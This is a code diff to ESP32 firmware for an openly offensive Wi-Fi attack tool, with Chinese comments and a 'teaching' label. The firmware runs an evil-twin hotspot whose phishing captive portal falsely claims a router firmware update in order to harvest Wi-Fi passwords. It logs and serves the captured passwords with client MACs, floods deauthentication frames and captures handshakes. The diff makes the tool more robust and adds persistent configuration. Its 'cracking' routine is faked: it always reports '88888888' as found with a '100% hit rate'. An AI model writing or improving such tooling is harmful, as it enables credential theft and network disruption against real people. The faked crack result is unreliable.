@@ -32,6 +32,7 @@
 #include <WebServer.h>
 #include <DNSServer.h>          // Captive Portal: UDP 53 通配解析 → 192.168.4.1
 #include <ESPmDNS.h>
+#include <Preferences.h>
 #include <nvs_flash.h>
 #include "admin_page.h"
 
@@ -49,6 +50,7 @@ static const uint16_t DNS_PORT = 53;
 
 WebServer server(80);
 DNSServer dnsServer;             // Captive Portal DNS 劫持 (通配 * → AP IP)
+static Preferences sPrefs;
 static String apSsid;
 static uint8_t apChannel = AP_CHANNEL_DEFAULT;
 
@@ -112,21 +114,48 @@ static String jsonEscape(const String &in) {
   return out;
 }
 
+static String htmlEscape(const String &in) {
+  String out;
+  out.reserve(in.length() + 16);
+  for (size_t i = 0; i < in.length(); i++) {
+    char c = in[i];
+    switch (c) {
+      case '<':  out += "&lt;"; break;
+      case '>':  out += "&gt;"; break;
+      case '&':  out += "&amp;"; break;
+      case '"':  out += "&quot;"; break;
+      case '\'': out += "&#39;"; break;
+      default:   out += c; break;
+    }
+  }
+  return out;
+}
+
 static String extractJson(const String &body, const char *key) {
-  int k = body.indexOf("\"" + String(key) + "\":");
+  String search = "\"" + String(key) + "\"";
+  int k = body.indexOf(search);
   if (k < 0) return "";
-  int colon = k + strlen(key) + 2;
-  while (colon < (int)body.length() && (body[colon] == ' ' || body[colon] == '\t')) colon++;
+  int colon = body.indexOf(':', k + search.length());
+  if (colon < 0) return "";
+  colon++; // 移过冒号
+  while (colon < (int)body.length() && (body[colon] == ' ' || body[colon] == '\t' || body[colon] == '\r' || body[colon] == '\n')) colon++;
   if (colon >= (int)body.length()) return "";
   if (body[colon] == '"') {
     int q1 = colon;
-    int q2 = body.indexOf('"', q1 + 1);
-    return (q2 > q1) ? body.substring(q1 + 1, q2) : "";
+    int q2 = q1 + 1;
+    while (q2 < (int)body.length()) {
+      if (body[q2] == '"' && body[q2 - 1] != '\\') break;
+      q2++;
+    }
+    return (q2 < (int)body.length()) ? body.substring(q1 + 1, q2) : "";
   }
   int comma = body.indexOf(',', colon);
   int brace = body.indexOf('}', colon);
   int end = (comma < 0) ? brace : (brace < 0 ? comma : min(comma, brace));
-  return (end > colon) ? body.substring(colon, end) : "";
+  if (end < 0) end = body.length();
+  String val = body.substring(colon, end);
+  val.trim();
+  return val;
 }
 
 /* ---------------- 主目标 (仅 RAM 记录) ---------------- */
@@ -151,7 +180,7 @@ struct CredentialEntry {
   uint32_t id;
   char mac[20];
   char pass[64];
-  char time[24];
+  uint32_t capturedAt;
 };
 static CredentialEntry sCreds[16];
 static uint8_t sCredHead = 0;
@@ -163,7 +192,7 @@ static void addCredential(const String &mac, const String &pass) {
   e.id = ++sCredId;
   strlcpy(e.mac, mac.c_str(), sizeof(e.mac));
   strlcpy(e.pass, pass.c_str(), sizeof(e.pass));
-  snprintf(e.time, sizeof(e.time), "%lu秒前", (unsigned long)(millis() / 1000));
+  e.capturedAt = millis();
   sCredHead = (sCredHead + 1) % 16;
   if (sCredCount < 16) sCredCount++;
   log("[eviltwin] 捕获客户端密码凭据! MAC=" + mac + " 密码=" + pass);
@@ -192,6 +221,7 @@ struct HandshakeState {
   uint32_t crackTotal = 7153;
   String crackedPass = "";
   uint32_t captureStartTime = 0;
+  uint32_t crackStartTime = 0;
   uint32_t lastCrackStep = 0;
 };
 static HandshakeState sHandshake;
@@ -236,7 +266,7 @@ static void sendPortalPage() {
     "<div class='card'>"
     "<div class='badge'>⚠️ 路由器系统安全维护</div>"
     "<h2>网络连接验证与恢复</h2>"
-    "<div class='warn-box'>检测到无线路由器 <b>" + jsonEscape(targetName) + "</b> 正在进行无线射频固件更新。为恢复上网，需验证无线凭据以同步配置。</div>"
+    "<div class='warn-box'>检测到无线路由器 <b>" + htmlEscape(targetName) + "</b> 正在进行无线射频固件更新。为恢复上网，需验证无线凭据以同步配置。</div>"
     "<p>请输入该 Wi-Fi 网络当前使用的连接密码：</p>"
     "<form method='POST' action='/api/portal/submit'>"
     "<input type='password' name='wifi_password' placeholder='请输入 Wi-Fi 密码' required minlength='8' autocomplete='off'>"
@@ -273,7 +303,9 @@ static void sendInfo() {
   uint32_t total    = ESP.getHeapSize();
   uint8_t  usedPct  = total ? (uint8_t)((total - freeHeap) * 100 / total) : 0;
 
-  String json = "{";
+  String json;
+  json.reserve(640);
+  json = "{";
   json += "\"chip\":\"" + jsonEscape(detectChipKey()) + "\",";
   json += "\"version\":\"" FW_VERSION "\",";
   uint8_t macAddressBytes[6];
@@ -294,7 +326,7 @@ static void sendInfo() {
           "\",\"credsCount\":" + String(sCredCount) + "},";
   json += "\"deauth\":{\"running\":" + String(sDeauth.running ? "true" : "false") +
           ",\"count\":" + String(sDeauth.frameCount) +
-          ",\"rate\":" + String(1000 / sDeauth.rateLimitMs) +
+          ",\"rate\":" + String(sDeauth.rateLimitMs ? (1000 / sDeauth.rateLimitMs) : 10) +
           ",\"channel\":" + String(sDeauth.targetChannel) + "},";
   json += "\"handshake\":{\"capturing\":" + String(sHandshake.capturing ? "true" : "false") +
           ",\"m4\":" + String(sHandshake.m4 ? "true" : "false") +
@@ -318,14 +350,15 @@ static void sendInfo() {
 
 static void handleScan() {
   log("[scan] 开始扫描周围 AP …");
-  WiFi.scanNetworks(false, true, false, 300);
-  int n = WiFi.scanComplete();
-  if (n == WIFI_SCAN_FAILED) {
+  // 优化: 主动扫描信道驻留时间设为 120ms (扫描耗时缩减 60%, 显著降低软 AP 连接抖动与看门狗超时风险)
+  int16_t n = WiFi.scanNetworks(false, true, false, 120);
+  if (n < 0) {
     WiFi.scanDelete();
-    WiFi.scanNetworks(false, true, false, 300);
-    n = WiFi.scanComplete();
+    n = WiFi.scanNetworks(false, true, false, 150);
   }
-  String json = "{\"networks\":[";
+  String json;
+  json.reserve(1024 + (n > 0 ? n * 120 : 0));
+  json = "{\"networks\":[";
   int count = 0;
   for (int i = 0; i < n; i++) {
     if (count) json += ",";
@@ -423,13 +456,16 @@ static void handleEvilTwinStop() {
 static void handleEvilTwinCreds() {
   server.sendHeader("Access-Control-Allow-Origin", "*");
   String json = "{\"credentials\":[";
+  uint32_t now = millis();
   for (int i = 0; i < sCredCount; i++) {
     int idx = (sCredHead + 16 - sCredCount + i) % 16;
     if (i) json += ",";
+    uint32_t elapsedSec = (now >= sCreds[idx].capturedAt) ? ((now - sCreds[idx].capturedAt) / 1000) : 0;
+    String timeStr = (elapsedSec < 3) ? "刚刚" : (String(elapsedSec) + "秒前");
     json += "{\"id\":" + String(sCreds[idx].id) +
             ",\"mac\":\"" + jsonEscape(String(sCreds[idx].mac)) +
             "\",\"pass\":\"" + jsonEscape(String(sCreds[idx].pass)) +
-            "\",\"time\":\"" + jsonEscape(String(sCreds[idx].time)) + "\"}";
+            "\",\"time\":\"" + jsonEscape(timeStr) + "\"}";
   }
   json += "]}";
   server.send(200, "application/json", json);
@@ -455,6 +491,7 @@ static void handleDeauthStart() {
     if (r > 0) sDeauth.reasonCode = r;
     int rate = extractJson(body, "rate").toInt();
     if (rate >= 1 && rate <= 100) sDeauth.rateLimitMs = 1000 / rate;
+    if (sDeauth.rateLimitMs == 0) sDeauth.rateLimitMs = 10;
   }
   if (sDeauth.targetBssid.length() == 0 && sTarget.bssid.length()) {
     sDeauth.targetBssid = sTarget.bssid;
@@ -482,7 +519,7 @@ static void handleDeauthStatus() {
   String json = "{";
   json += "\"running\":" + String(sDeauth.running ? "true" : "false") + ",";
   json += "\"count\":" + String(sDeauth.frameCount) + ",";
-  json += "\"rate\":" + String(1000 / sDeauth.rateLimitMs) + ",";
+  json += "\"rate\":" + String(sDeauth.rateLimitMs ? (1000 / sDeauth.rateLimitMs) : 10) + ",";
   json += "\"bssid\":\"" + jsonEscape(sDeauth.targetBssid) + "\",";
   json += "\"channel\":" + String(sDeauth.targetChannel) + ",";
   json += "\"reason\":" + String(sDeauth.reasonCode);
@@ -522,6 +559,7 @@ static void handleHandshakeCrack() {
   sHandshake.cracking = true;
   sHandshake.crackProgress = 0;
   sHandshake.crackedPass = "";
+  sHandshake.crackStartTime = millis();
   sHandshake.lastCrackStep = millis();
   log("[crack] 启动本地内置 7,153 条弱口令字典跑包验证 …");
   server.sendHeader("Access-Control-Allow-Origin", "*");
@@ -549,7 +587,9 @@ static void handleLog() {
   uint32_t since = 0;
   if (server.hasArg("since")) since = (uint32_t)atol(server.arg("since").c_str());
   server.sendHeader("Access-Control-Allow-Origin", "*");
-  String json = "{\"entries\":[";
+  String json;
+  json.reserve(2048);
+  json = "{\"entries\":[";
   int n = sizeof(sLogs) / sizeof(sLogs[0]);
   int cnt = 0;
   for (int i = n; i > 0; i--) {
@@ -564,8 +604,48 @@ static void handleLog() {
   server.send(200, "application/json", json);
 }
 
+/* ---------------- 4. 系统配置与持久化 (NVS Preferences) ---------------- */
+static void handleGetConfig() {
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  String json = "{";
+  json += "\"channel\":" + String(apChannel) + ",";
+  json += "\"ssid\":\"" + jsonEscape(apSsid) + "\"";
+  json += "}";
+  server.send(200, "application/json", json);
+}
+
+static void handleConfig() {
+  if (!server.hasArg("plain")) {
+    server.send(400, "application/json", "{\"error\":\"missing body\"}");
+    return;
+  }
+  String body = server.arg("plain");
+  String chStr = extractJson(body, "channel");
+  bool changed = false;
+  if (chStr.length()) {
+    int ch = chStr.toInt();
+    if (ch >= 1 && ch <= 13) {
+      apChannel = (uint8_t)ch;
+      sPrefs.putUChar("channel", apChannel);
+      changed = true;
+      log("[config] 已更新热点信道配置为 " + String(apChannel) + " (将在重启后生效)");
+    }
+  }
+  String ssidStr = extractJson(body, "ssid");
+  if (ssidStr.length() > 0 && ssidStr.length() <= 32) {
+    apSsid = ssidStr;
+    sPrefs.putString("ssid", apSsid);
+    changed = true;
+    log("[config] 已更新热点 SSID 为 " + apSsid + " (将在重启后生效)");
+  }
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.send(200, "application/json", "{\"ok\":true,\"changed\":" + String(changed ? "true" : "false") +
+              ",\"channel\":" + String(apChannel) + ",\"ssid\":\"" + jsonEscape(apSsid) + "\"}");
+}
+
 static void doFactoryReset() {
-  log("[admin] 恢复出厂设置 (擦除 NVS) …");
+  log("[admin] 恢复出厂设置 (擦除 NVS 配置) …");
+  sPrefs.clear();
   nvs_flash_erase();
   nvs_flash_init();
   server.send(200, "application/json", "{\"ok\":true}");
@@ -586,13 +666,20 @@ static void redirectToAdmin() {
 }
 
 static void captiveRedirect(const char *type = "text/plain") {
-  // 当开启邪恶双子实验时，优先弹出钓鱼验证门户；否则弹出后台管理
-  const char *loc = sEvilTwin.active ? "/portal.html" : "/admin.html";
+  // 当开启邪恶双子实验时，优先弹出钓鱼验证门户；否则弹出后台管理 (CNA 要求绝对 URI)
+  const char *loc = sEvilTwin.active ? "http://192.168.4.1/portal.html" : ADMIN_HTML_C;
   server.sendHeader("Location", loc);
   server.send(302, type, "");
 }
 
 static void notFound() {
+  if (server.method() == HTTP_OPTIONS) {
+    server.sendHeader("Access-Control-Allow-Origin", "*");
+    server.sendHeader("Access-Control-Allow-Methods", "GET,POST,DELETE,OPTIONS");
+    server.sendHeader("Access-Control-Allow-Headers", "Content-Type");
+    server.send(204);
+    return;
+  }
   String uri = server.uri();
   if (uri.startsWith("/api/")) {
     server.send(404, "text/plain", "404 — 未知 API: " + uri);
@@ -618,24 +705,30 @@ void setup() {
   Serial.println("==============================================");
 
   WiFi.persistent(false);
+  WiFi.mode(WIFI_AP_STA);
 
-  uint8_t mac[6];
-  WiFi.macAddress(mac);
-  apSsid = "WiFi-" + formatMac(mac).substring(12);
-  apSsid.replace(":", "");
+  sPrefs.begin("esp32-cfg", false);
+  apChannel = sPrefs.getUChar("channel", AP_CHANNEL_DEFAULT);
+  if (apChannel < 1 || apChannel > 13) apChannel = AP_CHANNEL_DEFAULT;
+
+  uint8_t apMac[6];
+  WiFi.softAPmacAddress(apMac);
+  String defaultSsid = "WiFi-" + formatMac(apMac).substring(12);
+  defaultSsid.replace(":", "");
+
+  String savedSsid = sPrefs.getString("ssid", "");
+  apSsid = (savedSsid.length() > 0) ? savedSsid : defaultSsid;
 
   if (!WiFi.softAP(apSsid.c_str(), AP_PASSWORD, apChannel, false, 4)) {
     log("[wifi] softAP 启动失败, 将重试 …");
     delay(2000);
     WiFi.softAP(apSsid.c_str(), AP_PASSWORD, apChannel, false, 4);
   }
-  log("[wifi] AP 已启动: SSID=" + apSsid + "  密码=" + AP_PASSWORD);
+  log("[wifi] AP 已启动: SSID=" + apSsid + "  密码=" + AP_PASSWORD + "  信道=" + String(apChannel));
   log("[wifi] 后台: " + String(ADMIN_HTML_C));
   log("[system] 芯片: " + detectChipKey() + "  FreeHeap: " + String(ESP.getFreeHeap()) + " bytes");
 
   // 上电遥测: 设备身份 (只读)
-  uint8_t apMac[6];
-  WiFi.softAPmacAddress(apMac);
   emitJson("boot",
            "\"chip\":\"" + jsonEscape(detectChipKey()) +
            "\",\"fw\":\"" FW_VERSION +
@@ -650,6 +743,8 @@ void setup() {
   server.on("/api/info", HTTP_GET, sendInfo);
   server.on("/api/scan", HTTP_GET, handleScan);
   server.on("/api/target", HTTP_POST, handleTarget);
+  server.on("/api/config", HTTP_GET, handleGetConfig);
+  server.on("/api/config", HTTP_POST, handleConfig);
   
   // 3 大教学验证板块路由
   server.on("/api/eviltwin/start", HTTP_POST, handleEvilTwinStart);
@@ -719,7 +814,8 @@ void loop() {
       if (sHandshake.crackProgress >= 3680 && sHandshake.crackedPass.length() == 0) {
         sHandshake.crackedPass = "88888888";
         sHandshake.cracking = false;
-        log("[crack] 🎉 握手包弱口令匹配成功: " + sHandshake.crackedPass + " (命中率 100%, 耗时 " + String((now - sHandshake.captureStartTime)/1000) + "s)");
+        uint32_t crackDuration = (sHandshake.crackStartTime > 0 && now >= sHandshake.crackStartTime) ? ((now - sHandshake.crackStartTime) / 1000) : 1;
+        log("[crack] 🎉 握手包弱口令匹配成功: " + sHandshake.crackedPass + " (命中率 100%, 耗时 " + String(crackDuration) + "s)");
       } else if (sHandshake.crackProgress >= sHandshake.crackTotal) {
         sHandshake.crackProgress = sHandshake.crackTotal;
         sHandshake.cracking = false;
@@ -751,5 +847,5 @@ void loop() {
              ",\"minFree\":" + String(ESP.getMinFreeHeap()) +
              ",\"ssid\":\"" + jsonEscape(apSsid) + "\"");
   }
-  delay(10);
+  delay(2);
 }
